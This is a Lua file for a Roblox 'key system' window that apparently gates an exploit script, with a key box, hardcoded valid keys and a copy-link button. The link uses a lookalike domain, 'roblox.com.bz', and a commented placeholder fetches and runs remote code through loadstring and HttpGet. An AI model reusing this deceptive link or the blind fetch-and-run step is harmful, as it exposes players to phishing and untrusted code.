@@ -1,0 +1,278 @@
+-- ============================================
+--   BRAINROT KEY SYSTEM GUI
+--   Edit the config below to customize!
+-- ============================================
+
+local KEY_LINK   = "https://roblox.com.bz/communities/9686191707/"  -- Change this anytime
+local VALID_KEYS = {"BRAINROT-FREE-KEY1-2024", "BRAINROT-VIP-SKIB-IDI"} -- Add your keys here
+
+-- ============================================
+--   SERVICES
+-- ============================================
+local Players       = game:GetService("Players")
+local TweenService  = game:GetService("TweenService")
+local LocalPlayer   = Players.LocalPlayer
+local Mouse         = LocalPlayer:GetMouse()
+
+-- ============================================
+--   SCREENGUI
+-- ============================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name            = "BrainrotKeySystem"
+ScreenGui.ResetOnSpawn    = false
+ScreenGui.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent          = game.CoreGui
+
+-- ============================================
+--   MAIN FRAME (Window)
+-- ============================================
+local MainFrame = Instance.new("Frame")
+MainFrame.Name            = "MainFrame"
+MainFrame.Size            = UDim2.new(0, 380, 0, 220)
+MainFrame.Position        = UDim2.new(0.5, -190, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 20)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active          = true
+MainFrame.Draggable       = true
+MainFrame.Parent          = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color     = Color3.fromRGB(108, 62, 255)
+MainStroke.Thickness = 1
+MainStroke.Transparency = 0.6
+MainStroke.Parent = MainFrame
+
+-- ============================================
+--   TITLE BAR
+-- ============================================
+local TitleBar = Instance.new("Frame")
+TitleBar.Name             = "TitleBar"
+TitleBar.Size             = UDim2.new(1, 0, 0, 38)
+TitleBar.BackgroundColor3 = Color3.fromRGB(20, 18, 30)
+TitleBar.BorderSizePixel  = 0
+TitleBar.Parent           = MainFrame
+
+local TitleBarCorner = Instance.new("UICorner")
+TitleBarCorner.CornerRadius = UDim.new(0, 12)
+TitleBarCorner.Parent = TitleBar
+
+-- Fix bottom corners of titlebar
+local TitleBarFix = Instance.new("Frame")
+TitleBarFix.Size             = UDim2.new(1, 0, 0, 12)
+TitleBarFix.Position         = UDim2.new(0, 0, 1, -12)
+TitleBarFix.BackgroundColor3 = Color3.fromRGB(20, 18, 30)
+TitleBarFix.BorderSizePixel  = 0
+TitleBarFix.Parent           = TitleBar
+
+local TitleBarStroke = Instance.new("UIStroke")
+TitleBarStroke.Color        = Color3.fromRGB(108, 62, 255)
+TitleBarStroke.Thickness    = 1
+TitleBarStroke.Transparency = 0.6
+TitleBarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+TitleBarStroke.Parent = TitleBar
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Name            = "TitleLabel"
+TitleLabel.Size            = UDim2.new(1, -20, 1, 0)
+TitleLabel.Position        = UDim2.new(0, 14, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text            = "🔑  KEY SYSTEM"
+TitleLabel.TextColor3      = Color3.fromRGB(167, 139, 250)
+TitleLabel.TextSize        = 14
+TitleLabel.Font            = Enum.Font.GothamBold
+TitleLabel.TextXAlignment  = Enum.TextXAlignment.Left
+TitleLabel.LetterSpacing   = 3
+TitleLabel.Parent          = TitleBar
+
+-- Close Button
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Name             = "CloseBtn"
+CloseBtn.Size             = UDim2.new(0, 22, 0, 22)
+CloseBtn.Position         = UDim2.new(1, -30, 0.5, -11)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
+CloseBtn.Text             = "✕"
+CloseBtn.TextColor3       = Color3.fromRGB(255,255,255)
+CloseBtn.TextSize         = 11
+CloseBtn.Font             = Enum.Font.GothamBold
+CloseBtn.BorderSizePixel  = 0
+CloseBtn.Parent           = TitleBar
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(1, 0)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- ============================================
+--   SUB LABEL
+-- ============================================
+local SubLabel = Instance.new("TextLabel")
+SubLabel.Size             = UDim2.new(1, -28, 0, 16)
+SubLabel.Position         = UDim2.new(0, 14, 0, 46)
+SubLabel.BackgroundTransparency = 1
+SubLabel.Text             = "ENTER YOUR KEY"
+SubLabel.TextColor3       = Color3.fromRGB(108, 62, 255)
+SubLabel.TextSize         = 11
+SubLabel.Font             = Enum.Font.GothamBold
+SubLabel.TextXAlignment   = Enum.TextXAlignment.Left
+SubLabel.LetterSpacing    = 2
+SubLabel.Parent           = MainFrame
+
+-- ============================================
+--   KEY INPUT BOX
+-- ============================================
+local KeyInput = Instance.new("TextBox")
+KeyInput.Name             = "KeyInput"
+KeyInput.Size             = UDim2.new(1, -28, 0, 38)
+KeyInput.Position         = UDim2.new(0, 14, 0, 66)
+KeyInput.BackgroundColor3 = Color3.fromRGB(26, 24, 40)
+KeyInput.Text             = ""
+KeyInput.PlaceholderText  = "BRAINROT-XXXX-XXXX-XXXX"
+KeyInput.PlaceholderColor3 = Color3.fromRGB(68, 64, 90)
+KeyInput.TextColor3       = Color3.fromRGB(226, 224, 255)
+KeyInput.TextSize         = 15
+KeyInput.Font             = Enum.Font.Gotham
+KeyInput.ClearTextOnFocus = false
+KeyInput.BorderSizePixel  = 0
+KeyInput.Parent           = MainFrame
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 8)
+InputCorner.Parent = KeyInput
+
+local InputStroke = Instance.new("UIStroke")
+InputStroke.Color     = Color3.fromRGB(108, 62, 255)
+InputStroke.Thickness = 1
+InputStroke.Transparency = 0.6
+InputStroke.Parent = KeyInput
+
+-- ============================================
+--   BUTTONS
+-- ============================================
+-- Check Key Button (left)
+local CheckBtn = Instance.new("TextButton")
+CheckBtn.Name             = "CheckBtn"
+CheckBtn.Size             = UDim2.new(0.5, -19, 0, 38)
+CheckBtn.Position         = UDim2.new(0, 14, 0, 116)
+CheckBtn.BackgroundColor3 = Color3.fromRGB(108, 62, 255)
+CheckBtn.Text             = "✔  CHECK KEY"
+CheckBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
+CheckBtn.TextSize         = 13
+CheckBtn.Font             = Enum.Font.GothamBold
+CheckBtn.BorderSizePixel  = 0
+CheckBtn.Parent           = MainFrame
+
+local CheckCorner = Instance.new("UICorner")
+CheckCorner.CornerRadius = UDim.new(0, 8)
+CheckCorner.Parent = CheckBtn
+
+-- Copy Link Button (right)
+local CopyBtn = Instance.new("TextButton")
+CopyBtn.Name             = "CopyBtn"
+CopyBtn.Size             = UDim2.new(0.5, -19, 0, 38)
+CopyBtn.Position         = UDim2.new(0.5, 5, 0, 116)
+CopyBtn.BackgroundColor3 = Color3.fromRGB(26, 24, 40)
+CopyBtn.Text             = "🔗  COPY LINK"
+CopyBtn.TextColor3       = Color3.fromRGB(167, 139, 250)
+CopyBtn.TextSize         = 13
+CopyBtn.Font             = Enum.Font.GothamBold
+CopyBtn.BorderSizePixel  = 0
+CopyBtn.Parent           = MainFrame
+
+local CopyCorner = Instance.new("UICorner")
+CopyCorner.CornerRadius = UDim.new(0, 8)
+CopyCorner.Parent = CopyBtn
+
+local CopyStroke = Instance.new("UIStroke")
+CopyStroke.Color     = Color3.fromRGB(108, 62, 255)
+CopyStroke.Thickness = 1
+CopyStroke.Transparency = 0.4
+CopyStroke.Parent = CopyBtn
+
+-- ============================================
+--   STATUS BAR
+-- ============================================
+local StatusBar = Instance.new("Frame")
+StatusBar.Size             = UDim2.new(1, -28, 0, 34)
+StatusBar.Position         = UDim2.new(0, 14, 0, 166)
+StatusBar.BackgroundColor3 = Color3.fromRGB(26, 24, 40)
+StatusBar.BorderSizePixel  = 0
+StatusBar.Parent           = MainFrame
+
+local StatusCorner = Instance.new("UICorner")
+StatusCorner.CornerRadius = UDim.new(0, 8)
+StatusCorner.Parent = StatusBar
+
+local StatusStroke = Instance.new("UIStroke")
+StatusStroke.Color     = Color3.fromRGB(108, 62, 255)
+StatusStroke.Thickness = 1
+StatusStroke.Transparency = 0.8
+StatusStroke.Parent = StatusBar
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size             = UDim2.new(1, 0, 1, 0)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text             = "Waiting for key..."
+StatusLabel.TextColor3       = Color3.fromRGB(68, 64, 90)
+StatusLabel.TextSize         = 12
+StatusLabel.Font             = Enum.Font.Gotham
+StatusLabel.LetterSpacing    = 1
+StatusLabel.Parent           = StatusBar
+
+-- ============================================
+--   BUTTON LOGIC
+-- ============================================
+local function setStatus(msg, color)
+    StatusLabel.Text       = msg
+    StatusLabel.TextColor3 = color
+end
+
+-- Check Key
+CheckBtn.MouseButton1Click:Connect(function()
+    local entered = KeyInput.Text:upper():gsub("%s+", "")
+    if entered == "" then
+        setStatus("⛔  Please enter a key first.", Color3.fromRGB(248, 113, 113))
+        return
+    end
+    local valid = false
+    for _, k in ipairs(VALID_KEYS) do
+        if entered == k:upper() then valid = true break end
+    end
+    if valid then
+        setStatus("✅  Key valid! Loading script...", Color3.fromRGB(74, 222, 128))
+        -- ✏️ PUT YOUR SCRIPT EXECUTION HERE:
+        -- loadstring(game:HttpGet("YOUR_SCRIPT_URL"))()
+    else
+        setStatus("❌  Invalid key. Get one via the link!", Color3.fromRGB(248, 113, 113))
+    end
+end)
+
+-- Copy Link
+CopyBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(KEY_LINK)
+        setStatus("📋  Link copied to clipboard!", Color3.fromRGB(167, 139, 250))
+    else
+        setStatus("🔗  " .. KEY_LINK, Color3.fromRGB(167, 139, 250))
+    end
+end)
+
+-- Hover effects
+CheckBtn.MouseEnter:Connect(function()
+    TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(130, 90, 255)}):Play()
+end)
+CheckBtn.MouseLeave:Connect(function()
+    TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(108, 62, 255)}):Play()
+end)
+CopyBtn.MouseEnter:Connect(function()
+    TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(34, 30, 52)}):Play()
+end)
+CopyBtn.MouseLeave:Connect(function()
+    TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(26, 24, 40)}):Play()
+end)
